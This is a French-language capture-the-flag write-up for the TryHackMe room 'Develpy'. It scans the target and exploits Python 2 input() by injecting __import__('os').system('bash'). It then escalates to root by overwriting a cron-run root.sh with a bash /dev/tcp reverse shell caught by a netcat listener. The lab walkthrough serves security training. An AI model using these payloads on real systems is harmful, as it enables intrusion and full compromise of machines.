# Develpy-Write-up
Write-up Room Develpy Tryhackme


Cliquez [ici](https://tryhackme.com/room/bsidesgtdevelpy) pour accéder au room.

# Première étape : Identifier la cible et ses vulnérabilités.

On commence par un scan de port avec nmap.

```bash

nmap -sS -A -Pn [IP]
```


![](img/Develpy_scan.png?raw=true) 

On voit q'au niveau du port 10000 il y a un petit script python qui tourne.
On se connecte au serveur sur ce port pour voir ce que ça donne.


```bash

nc [IP] 10000
```
![](img/Develpy_nc0.png?raw=true)

![](img/Develpy_nc0-1.png?raw=true)

>Ce script est écrit en python mais dans quelle version de python?
>On voit aussi que le module input est utilisé.


**NameError: name 'a' is not defined**

On a l'exception suivante si on entre une lettre.
>Ce qui veut dire que python n'a pas pu identifier la variable ou le module "a" : On a donc pas définit une varibale ou un module de nom de "a"

**Il s'agit d'une vulnérabilité de python2 qui permet d'exécuter des codes sur la machine via python.**

# Deuxième étape : exploitation de vulnérabilité

Il y a plusieurs manières d'exploiter cette vulnérabilité.

```python
__import__('os').system('bash')
```
On va envoyer ce code ci-dessus pour exécuter la commande bash sur la machine.
Une fois que ça serra fait on aurra accès à la machine sur l'utilisateur sur lequel est exécuté le script.

![](img/Develpy_nc.png?raw=true)

On est mainténant loggé sur le user king.

```bash
cat user.txt
```
**Avec la commande ci-dessus on a le premier flag.**


# Troisième étape : Escalade de privilège


![](img/Develpy_nc_id.png?raw=true)

On est bien sur l'user king.

![](img/Develpy_nc_cron.png?raw=true)

Le fichier root.sh est executé à tout moment par le cron en root.
En modifiant son contenu on pourra donc exécuter un script pour se connecter au shell root.
Quand ça serra fait on aurra accès au root.

Démarrons une connexion en écoute(listener) sur notre terminal locale(machine de l'attaquant).
```bash
nc -l -vv -p 4444
```
4444 est le port que j'ai utilisé,vous pouvez le changer.

Supprimer le fichier root.sh.

Executer la commande ci-dessous pour recréer le fichier root avec le contenu **bash -i >& /dev/tcp/[Your IP]/4444 0>&1** afin d'établir la connection.

```bash
echo "bash -i >& /dev/tcp/[Your IP]/4444 0>&1" > root.sh

```

Après ça,une fois que le script serras réexécuter par le cron on aurra accès au root.

![](img/Develpy_nc_root.png?raw=true)

**Avec un   cat    /root/root.txt   on a le flag**
